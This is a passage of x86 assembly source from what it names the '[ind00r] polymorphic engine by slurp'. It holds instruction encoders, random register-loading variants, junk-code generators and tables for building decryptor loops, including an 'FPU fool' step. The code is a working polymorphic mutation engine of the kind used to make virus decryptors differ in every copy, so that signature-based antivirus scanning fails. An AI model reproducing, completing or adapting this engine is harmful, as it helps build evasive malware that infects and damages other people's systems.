                or    al, MOD_REG               ; register
                xchg  eax, ecx
                mov   al, OPSIZE_32             ; 32-bit operand
                jmp   ciOpRMImm

                ; method 3: mov reg, rnd;
                ;           sub/add/xor reg, imm add/sub/xor rnd
glr_meth3:      mov   al, MOV_REG_IMM32         ; mov reg, imm32 opcode
                xor   eax, ebx                  ; add register
                stosb                           ; store it
                call  rnd32                     ; get a random dword
                stosd                           ; store it
                xchg  eax, edx                  ; random value
                xchg  eax, ecx                  ; immediate
                call  iBlockJunkAR              ; generate junk block
                push  0x03                       ; add, sub, xor
                call  rnd32r
                test  eax, eax                  ; add?
                jz    glr_m3_1
                add   al, OPTYPE_SUB - 1        ; no, sub/xor
glr_m3_1:       test  eax, eax
                jnz   glr_m3_2
                neg   edx
                add   edx, ecx                  ; - random + immediate
glr_m3_2:       cmp   al, OPTYPE_SUB
                jnz   glr_m3_3
                sub   edx, ecx                  ; random - immediate
glr_m3_3:       cmp   al, OPTYPE_XOR
                jnz   glr_m3_4
                xor   edx, ecx                  ; random xor immediate
glr_m3_4:       xchg  eax, ebx
                or    al, MOD_REG
                xchg  eax, ecx
                mov   al, OPSIZE_32
                jmp   ciOpRMImm

                ; method 4: mov reg, imm ror/rol rnd;
                ;           ror/rol reg, rnd
glr_meth4:      call  rnd32
                and   al, 0x1F
                jz    glr_meth4
                xchg  eax, ecx
                xchg  eax, edx
                push  ebx
                mov   bl, ROL_SHIFT
                test  ch, 0x01
                jz    glr_m4_rol
                rol   eax, cl
                inc   ebx
                jmp   glr_m4_ror
glr_m4_rol:     ror   eax, cl
glr_m4_ror:     xchg  dl, cl
                pop   ecx
                mov   byte [edi], MOV_REG_IMM32
                xor   [edi], cl
                inc   edi
                stosd
                xchg  ah, dl
                xchg  ebx, ecx
                call  iBlockJunkAR
                xchg  ebx, ecx
                mov   al, OPSIZE_32
                mov   bh, SHIFT_IMM
                cmp   ah, 0x01
                jnz   glr_m4_n1
                inc   bh
glr_m4_n1:      xor   ecx, 0xFFFFFF00 ^ MOD_REG
                jmp   ciShiftRM

glr_methods:       
                dd     glr_meth1 - idelta
                dd     glr_meth2 - idelta
                dd     glr_meth3 - idelta
                dd     glr_meth4 - idelta
%define GLR_METHCNT      0x04
;gLoadReg        endp
; relocates a long jump (32-bit displacement)
; [address of disp] points to the byte after the opcode
RelLongJmp:     ; [address], [address of disp]
                push  eax
                push  edi
                mov   eax, [esp+0x0C]        ; where to jump
                mov   edi, [esp+0x10]        ; address of displacement
                neg   edi
                lea   eax, [eax+edi-0x04]
                neg   edi
                stosd
                pop   edi
                pop   eax
                ret   0x08
;RelLongJmp      endp
; generates a shift instruction.
;
; AL: operand size
;       you can generate byte, word or dword operations. choose between
;       OPSIZE_8, OPSIZE_16 and OPSIZE_32. you may generate a random
;       number < OPSIZE_RND.
;
; AH: immediate shift value
;
; BL: shift type (ROL_SHIFT, SHL_SHIFT, RCR_SHIFT, ...)
;       you can use random value < RND_SHIFT
;
;
; BH: shift operand type
;       SHIFT_IMM
;       SHIFT_1
;       SHIFT_CL
;       or random value < SHIFT_RND
;
; CL: R/M operand. can be:
;       1. register (REG_??? or MOD_REG)
;       2. memory, using register as index (REG_???)
;       3. memory, immediate address (MOD_DIRECT), ESI = virtual address
;
; CH: second index register + scaling factor
;       REG_??? + NO_SCALE / SCALE_2/4/8
;       (use random value < SCALE_RND, to get random register & scaling).
;       if this byte is zero, no SIB byte is used.
;       take special care when using no scaling factor (logical or with
;       NO_SCALE)
;
; ESI: displacement
;    if this is zero, no displacement is used.
;    when usin' direct addressing (MOD_DIRECT), this register contains
;    immediate memory address.
;    if ESI is in the range between -128 and 127, 8-bit displacement is
;    used. when you're using 8-bit displacement calculate them like this:
;    movsx esi, rm8          ; rm8 = 8-bit register or memory operand
;                            ; containing 8-bit displacement.
;
ciShiftRM:
                pushad
                test  al, OPSIZE_16        ; check if 16-bit operand
                jz    ciSRno_prefix        ; no, we don't need a prefix
                mov   byte [edi], 0x66  ; write prefix
                inc   edi                  ; increment pointer
                dec   eax                  ; change operand size to 32-bit
ciSRno_prefix:  cmp   ah, 0x01
                jnz   ciSRasdlkfj
                cmp   bh, SHIFT_IMM
                test  bh, bh
                jnz   ciSRasdlkfj
                mov   bh, SHIFT_1
ciSRasdlkfj:    test  bh, bh
                jz    ciSRt_imm         ; shift by immediate value
                test  bh, SHIFT_CL
                jz    ciSRt_1
                or    al, 0x02
ciSRt_1:        or    al, 0x10
ciSRt_imm:      or    al, OP_SHIFT
                stosb
                cmp   bl, SAR_SHIFT
                jnz   ciSRnot_sar
                inc   ebx
ciSRnot_sar:    mov   al, bh
                push  eax
                call  ciCreateOperand
                pop   eax
                test  al, SHIFT_1 | SHIFT_CL
                jnz   ciSRexit
                xchg  al, ah
                stosb
ciSRexit:       mov   [esp], edi
                popad
                ret
;ciShiftRM       endp
; generates a math operation, move, compare or exchange instruction.
;
; AL: operand size
;       you can generate byte, word or dword operations. choose between
;       OPSIZE_8, OPSIZE_16 and OPSIZE_32. you may generate a random
;       number < OPSIZE_RND.
;
; AH: direction (MEM_REG, REG_MEM)
;       MEM_REG, from register to memory (write)
;       REG_MEM, from memory to register (read)
;       or random value < DIR_RND.
;
; BL: register
;     REG_??? or random value lower than REG_RND
;
; BH: operation type
;       the following operations are generated:
;       ADD, OR, ADC, SBB, AND, SUB, XOR, CMP, MOV, XCHG, TEST
;       use the corresponding OPTYPE_??? constant as operation type.
;       you can also use a random number lower than OPTYPE_RND constant.
;
; CL: R/M operand. can be:
;       1. register (REG_??? or MOD_REG)
;       2. memory, using register as index (REG_???)
;       3. memory, immediate address (MOD_DIRECT), ESI = virtual address
;
; CH: second index register + scaling factor
;       REG_??? + NO_SCALE / SCALE_2/4/8
;       (use random value < SCALE_RND, to get random register & scaling).
;       if this byte is zero, no SIB byte is used.
;       take special care when using no scaling factor (logical or with
;       NO_SCALE)
;
; ESI: displacement
;    if this is zero, no displacement is used.
;    when usin' direct addressing (MOD_DIRECT), this register contains
;    immediate memory address.
;    if ESI is in the range between -128 and 127, 8-bit displacement is
;    used. when you're using 8-bit displacement calculate them like this:
;    movsx esi, rm8          ; rm8 = 8-bit register or memory operand
;                            ; containing 8-bit displacement.
ciOpRMReg:
                pushad
                cmp   al, OPSIZE_16         ; check if 16-bit operand
                jnz   ciORRno_prefix        ; no, we don't need a prefix
                mov   byte [edi], 0x66   ; write prefix
                inc   edi                   ; increment pointer
                dec   eax                   ; change operand size to 32-bit

ciORRno_prefix: cmp   bh, OPTYPE_TEST       ; check if TEST instruction
                jnz   ciORRlame1
                mov   bh, 0x090              ; real opcode ROR 3
                xor   ah, ah                ; we can only use MEM_REG
ciORRlame1:     cmp   bh, OPTYPE_XCHG       ; check if XCHG instruction
                jnz   ciORRlame2
                mov   bh, 0x0D0              ; real opcode ROR 3
                test  al, al                ; check if 8-bit operand
                jz    ciORRlame2            ; next 2 checkz are obsolete

                mov   dl, cl
                and   dl, MOD_REG
                cmp   dl, MOD_REG
                jnz   ciORRblah

                xchg  cl, bl
                test  cl, cl                 ; check if reg field is eax
                jz    ciORRxchgeax           ; yes, generate xchg eAX, ??
                xchg  bl, cl
                cmp   cl, REG_EAX | MOD_REG ; check if r/m field is eax
                jnz   ciORRlame2
ciORRxchgeax:   test  cl, MOD_DISP8
                jz    ciORRblah
                test  cl, MOD_DISP32
                jz    ciORRblah

                mov   al, bl                ; BL contains reg
                and   al, 0x3F               ; clear MOD_REG bits
                or    al, XCHG_EAX_REG      ; generate opcode
                stosb                       ; store opcode
                jmp   ciORRexit             ; done! we saved one byte, but
                                            ; poly engine grows 25 bytes :p
ciORRblah:
ciORRlame2:     cmp   bh, OPTYPE_MOV          ; check if MOV instruction
                jnz   ciORRlame3
                mov   bh, 0x011                ; real opcode ROR 3
ciORRlame3:     shl   ah, 1
                or    al, ah                  ; operand size + direction
                rol   bh, 0x03                 ; operation number ROL 3
                or    al, bh
                stosb                         ; store opcode
                call  ciCreateOperand         ; create R/M byte
ciORRexit:      mov   [esp], edi
                popad
                ret
;ciOpRMReg       endp
; generates a math operation, move or compare instruction.
;
; AL: operand size
;       you can generate byte, word or dword operations. choose between
;       OPSIZE_8, OPSIZE_16 and OPSIZE_32. you may use random operand size
;       (random number must be lower than OPSIZE_RND)
;
; BL: operation type
;       the following operations are generated:
;       ADD, OR, ADC, SBB, AND, SUB, XOR, CMP, MOV, XCHG, TEST
;       use the corresponding OPTYPE_??? constant as operation type.
;       you can also use a random number lower than OPTYPE_RND constant.
;
;
; CL: R/M operand. can be:
;       1. register (REG_??? or MOD_REG)
;       2. memory, using register as index (REG_???)
;       3. memory, immediate address (MOD_DIRECT), ESI = virtual address
;
;       hey, you'd bet right! here you can also use random value! :I
;       REG_RND for random register (don't forget to set MOD_REG),
;       REG_RND for random index reg
;       and finally MEM_RND for random index reg, but also direct
;       addressing (means no index reg is used, but memory address)
;
; CH: second index register + scaling factor
;       REG_??? + NO_SCALE / SCALE_2/4/8
;       (use random value < SCALE_RND, to get random register & scaling).
;       if this byte is zero, no SIB byte is used.
;       take special care when using no scaling factor (logical or with
;       NO_SCALE)
; EDX/DX/DL: immediate value
;
; ESI: displacement or immediate address
;
; if operation is MOV and operand is register, generate MOV reg, imm8/16/32
; if operation is MOV and operand is memory, generate MOV mem, imm8/16/32
; if operation is TEST, generate TEST r/m, imm8/16/32
; if operand is register and register is EAX/AX/AL, no R/M byte is used.
; (other opcode)
;
ciOpRMImm:
                pushad
                push  edx
                mov   edx, eax
                cmp   al, OPSIZE_16        ; are we usin' 16-bit operands?
                jnz   ciORIno_prefix       ; no, we don't need a prefix.
                mov   byte [edi], 0x66  ; store prefix
                inc   edi
                dec   eax

                ; check for MOV operation

ciORIno_prefix: cmp   bl, OPTYPE_MOV         ; MOV operation?
                jnz   ciORInot_mov           ; no, check next

                ; check if operand is register

                push  eax                    ; push operand size.
                mov   eax, ecx
                xor   al, MOD_REG            ; invert MOD_??? bits
                test  al, MOD_REG            ; they aren't 00 now?
                jnz   ciORInot_reg           ; operand is not register
                pop   ecx                    ; pop operand size
                shl   cl, 0x03                ; generate 0xB0 or 0xB8 opcode
                or    al, cl                 ; register OR operand size
                or    al, MOV_REG_IMM
                stosb                        ; store opcode
                jmp   ciORIwrite_imm         ; write immediate

                ; generate MOV mem, imm

ciORInot_reg:   pop   eax                    ; pop operand size
                or    al, MOV_MEM_IMM
                stosb
                xor   ebx, ebx
                jmp   ciORIcreate_rm

                ; Check for TEST operation

ciORInot_mov:   cmp   bl, OPTYPE_TEST        ; TEST operation?
                jnz   ciORInot_test          ; no, check next
                cmp   cl, REG_EAX | MOD_REG ; reg = EAX/AX/AL?
                jnz   ciORInot_eax1
                or    al, TEST_EAX_IMM       ; generate TEST eAX/AL, imm
                stosb
                jmp   ciORIwrite_imm

ciORInot_eax1:  or    al, OP_GROUP3          ; opcode for operation group 3
                stosb                        ; store
                xor   bl, bl                 ; TEST r/m, Ib/Iv
                jmp   ciORIcreate_rm

                ; check if EAX/AX/AL register.
                ; if yes, we can generate opcode by shifting left operation
                ; type by 0x03, adding 0x04 and adding operand size.

ciORInot_test:
                ; if all above fails, generate operation from immediate
                ; group (group 1). opcode 0x80 or operand size.
                ; if it is a 32-bit immediate, we check if immediate value
                ; fits in byte (-128 <= immediate >= 127). we can save 3
                ; bytes that will be 0x000000 or 0xFFFFFF anyway. :-%

                push  edx
                or    al, OP_GROUP1
                test  al, OPSIZE_32
                jz    ciORIblah

                mov   edx, [esp + 0x04]
                movsx edx, dl
                cmp   edx, [esp + 0x04]
                jne   ciORIblah
                inc   eax
                and   byte [esp], 0x00
                inc   eax        ; use byte imm, sign extended to dword
ciORIblah:      jnz   ciORInot_eax2

                pop   edx
                cmp   cl, REG_EAX | MOD_REG  ; register = EAX/AX/AL?
                jnz   ciORInot_eax3          ; nope, create operation
                                             ; from group 1 (immediate ops)
                shl   bl, 0x03                ; operation type
                or    bl, USE_EAX            ; opcode ?0x4 or ?0x5
                and   al, 0x01
                or    al, bl                 ; add operand size
                stosb                        ; store opcode
                jmp   ciORIwrite_imm         ; write immediate value

ciORInot_eax2:
                pop   edx
ciORInot_eax3:  stosb
ciORIcreate_rm:
                call  ciCreateOperand
ciORIwrite_imm: test  dl, dl
                jz    ciORIimm8
                test  dl, OPSIZE_16
                jnz   ciORIimm16
                pop   eax
                stosd
                jmp   ciORIexit
ciORIimm16:     pop   eax
                stosw
                jmp   ciORIexit
ciORIimm8:      pop   eax
                stosb
ciORIexit:      mov   [esp], edi
                popad
                ret
;ciOpRMImm       endp

; ciCreateOperand
;
; creates MOD/RM byte and if needed SIB byte, and stores da displacement
;
; BL: register or additional opcode information
;
; CL: R/M operand. can be:
;      - register operand: REG_??? + MOD_REG
;      - memory operand, index register: REG_???
;      - memory operand, immediate addressing: MOD_DIRECT
;
; CH: second index register + scaling factor
;       REG_??? + NO_SCALE / SCALE_2/4/8
;       (use random value < SCALE_RND, to get random register & scaling).
;       if this byte is zero, no SIB byte is used.
;       take special care when using no scaling factor (logical or with
;       NO_SCALE)
;
; ESI: displacement
;    if this is zero, no displacement is used.
;    when usin' direct addressing (MOD_DIRECT), this register contains
;    immediate memory address.
;    if ESI is in the range between -128 and 127, 8-bit displacement is
;    used. when you're using 8-bit displacements calculate them like this:
;    movsx esi, rm8          ; rm8 = 8-bit register or memory operand
;                            ; containing 8-bit displacement.
;    this check isn't performed when MOD_DISP8 or MOD_DISP32
;
ciCreateOperand:
                pushad
                mov   eax, ecx
                and   al, MOD_REG
                cmp   al, MOD_REG          ; R/M operand = register?
                jz    COcreate_mr          ; yes, directly to ciCreateMODRM
                test  cl, MOD_DIRECT       ; direct addressing?
                jnz   COno_disp
                mov   eax, esi
                test  eax, eax             ; displacement = 0?
                jz    COno_disp            ; don't use displacement
                or    cl, MOD_DISP32       ; set 32-bit displacement
                test  cl, MOD_DIRECT
                jnz   COno_disp
                movsx eax, al
                cmp   eax, esi
                jne   COno_disp
                xor   cl, MOD_REG
COno_disp:      test  ch, ch               ; second index register?
                jz    COcreate_mr          ; no, we don't need SIB
                or    cl, MOD_SIB          ; set SIB flag
COcreate_mr:
; create MOD/RM byte
;
; BL = register or additional opcode information (bits 3, 4, 5)
; CL = register or memory operand (bits 0,1,2)
;      - register operand: REG_??? + MOD_REG
;      - memory operand, no displacement: REG_??? + MOD_NODISP
;      - memory operand, 8-bit displacement: REG_??? + MOD_DISP8
;      - memory operand, 32-bit displacement: REG_??? + MOD_DISP32
;      - memory operand, immediate addressing: MOD_DIRECT
;      - sib memory operand, no displacement: MOD_SIB + MOD_NODISP
;      - sib memory operand, 8-bit displacement: MOD_SIB + MOD_DISP8
;      - sib memory operand, 32-bit displacement: MOD_SIB + MOD_DISP32
;      - sib memory operand, immediate addressing: MOD_DIRECT + MOD_SIB
;
; output:
;
; AL = displacement size:
;        MOD_NODISP
;        MOD_DISP8
;        MOD_DISP32
;        MOD_DIRECT
;        MOD_SIB         ; if MOD_SIB the lower 3 bits are base register
;
; [EBP] with no displacement is immediate addressing. if you want [EBP],
; this procedure generates zero 8-bit displacement. if you want immediate
; address use MOD_DIRECT.
;
; [ESP] normally indicates that SIB byte follows. when you use [ESP] this
; procedure generates SIB byte (0x24). when you want to use SIB byte, use
; MOD_SIB.
;
; if no displacement, sib byte and [ebp] as base, zero 8-bit displacement
; is used if MOD_DIRECT + MOD_SIB, immediate address is used as base...
; AL = MOD_NODISP, MOD_DISP8 or MOD_DISP32 (or MOD_SIB if sib)
; CL = base
;         REG_???
; CH = index
;         REG_??? (not ESP) + NOSCALE/SCALE_2/4/8
;
; AL = MOD_NODISP, MOD_DISP8 or MOD_DISP32 (or MOD_SIB if sib)

                shl   ebx, 0x03             ; register
                ; let's check if operand is register

                mov   eax, ecx
                and   al, MOD_REG          ; clear bits 0-5
                xor   al, MOD_REG          ; invert bit 6 & 7
                jnz   CMblah1              ; memory operand.
                xchg  eax, ecx
                and   al, 0x0C7
                or    eax, ebx
                stosb                      ; directly create it!
                xor   eax, eax             ; return MOD_NODISP
                jmp   CMexit1
CMblah1:        mov   eax, ecx
                and   al, 0x0C7
                cmp   al, REG_EBP          ; EBP and no displacement?
                jnz   CMblah2
                or    cl, MOD_DISP8        ; use 8-bit displacement
CMblah2:        mov   eax, ecx
                and   al, 0x07 | MOD_DIRECT | MOD_SIB
                cmp   al, REG_ESP          ; ESP is index reg?
                jnz   CMblah3              ; nope
                or    eax, ebx
                and   cl, MOD_REG
                or    eax, ecx
                stosb
                mov   byte [edi], 0x24
                inc   edi
                and   al, MOD_REG
                jmp   CMexit1
CMblah3:        mov   eax, ecx
                test  al, MOD_DIRECT       ; direct addressing?
                jz    CMblah4              ; nope
                and   cl, 0x38
                or    cl, REG_EBP          ; no displacement and EBP
CMblah4:        mov   eax, ecx
                test  al, MOD_SIB          ; do we have SIB byte?
                jz    CMblah6              ; no SIB byte

                ; set ESP as index register (SIB)

                and   al, 0x0C0 | MOD_SIB  | MOD_DIRECT
                or    al, REG_ESP
                and   cl, 0x0C7 | MOD_SIB | MOD_DIRECT
CMblah6:        and   al, 0x0C7
                or    eax, ebx
                stosb
                mov   eax, ecx
                and   al, 0x0C7 | MOD_SIB | MOD_DIRECT
CMexit1:
                ; created MOD/RM byte. now let's do the displacement

                test  eax, eax             ; no displacement?
                jz    COexit               ; yes, exit
                test  al, MOD_SIB          ; SIB byte?
                jz    COblah               ; no, don't store SIB byte
                shl   ch, 0x03              ; creatin' SIB byte
                push  eax                  ; preserving addressing mode
                and   al, REG_RND - 1      ; mask base register
                or    al, ch
                stosb                      ; store SIB byte
                pop   eax
COblah:         test  al, MOD_DIRECT       ; direct addressing?
                jnz   COdirect             ; yes, store VA & exit
COblah2:        test  al, MOD_DISP8        ; do we have 8-bit displacement?
                jz    COblah3              ; no, perform next check
                xchg  esi, eax
                stosb
                jmp   COexit
COblah3:        test  al, MOD_DISP32
                jz    COexit
COdirect:       xchg  esi, eax
                stosd
COexit:         mov   [esp], edi
                popad
                ret
;ciCreateOperand endp
; initialized data
                db    '[ind00r] polymorphic engine by slurp', 0

; decryptor instructions generator addresses (relative to idelta)
Generatorz      dd     iProcLdPtr - idelta     ; load pointer
                dd     iProcLdCnt - idelta     ; load counter
                dd     iProcLdKey - idelta     ; load key
                dd     iProcDecData - idelta   ; decrypt data
                dd     iProcIncKey - idelta    ; increment key
                dd     iProcIncPtr - idelta    ; increment pointer
                dd     iProcDecCnt - idelta    ; decrement counter
                dd     iProcFPUFool - idelta   ; neat stuff :O
; junk instruction generator addresses (relative to idelta)

JunkGen         dd     iMemJunk - idelta
                dd     iRegJunk - idelta
%define JUNKGEN_CNT      0x02

; decryptor procedures are called in this order:
CallOrder1      db    LOAD_POINTER               ; ┐
                db    LOAD_COUNTER               ; ├ these procedures can
                db    LOAD_KEY                   ; ┘ be mixed.
CallOrder1_e:                
                db    DECRYPT_DATA      ; stays at its place
CallOrder2      db    INC_KEY                    ; ┐
                db    INC_POINTER                ; ├ these procedures can
                db    DEC_COUNTER                ; │ be mixed.
                db    FPU_FOOL                   ; │
                times JUNK_PROCS db    JUNK_PROC  ; ┘

; procedure order (1 byte for each procedures that will be mixed randomly)
ProcedureOrder  db    LOAD_POINTER
                db    LOAD_COUNTER
                db    LOAD_KEY
                db    DECRYPT_DATA
                db    INC_KEY
                db    INC_POINTER
                db    DEC_COUNTER
                db    FPU_FOOL
                times JUNK_PROCS db    JUNK_PROC
ProcedureOrder_e:

; registerz
Registers:         
preg            db    REG_ECX           ; pointer register
creg            db    REG_EDX           ; counter register
kreg            db    REG_EAX           ; key register
junkreg1        db    REG_EBX           ; junk register 1
junkreg2        db    REG_ESI           ; junk register 2
junkreg3        db    REG_EDI           ; junk register 3
Registers_e:

RandomConst     dd    RANDOM_SEED       ; random seed constant (unchanged
                                        ; during runtime)
idelta:                             ; delta offset (held in ebp)

; uninitialized data

RandomSeed      resd  1                 ; random seed (changed)

InitValues:                         ; some values we have to initialize
JunkSpSize      resd  1                 ; size of junk space
JunkSpRVA       resd  1                 ; address of junk space
DecryptRVA      resd  1                 ; address of encrypted code
CryptSize       resd  1                 ; size of crypted code
EncryptRVA      resd  1                 ; address of code to encrypt
CryptKey        resd  1                 ; encryption key
KeyIncrement    resd  1                 ; key incrementation
CryptType       resb  1                 ; encryption type (byte)
KeyIncType      resb  1                 ; key increment type (byte)

ProcParameters:  resb MAX_PROCS + 1
ProcAddress:     resd MAX_PROCS + 1

JunkProcs       resb  1                 ; number of junk procedures
ProcCount       resb  1                 ; number of procedures

CurrentProc     resb  1                 ; identifies current procedure when
                                        ; in the generator loop.
InLoop          resb  1                 ; boolean, if true we are
                                        ; generating decryptor loop
nojunk          resb  1

; end of ipe32
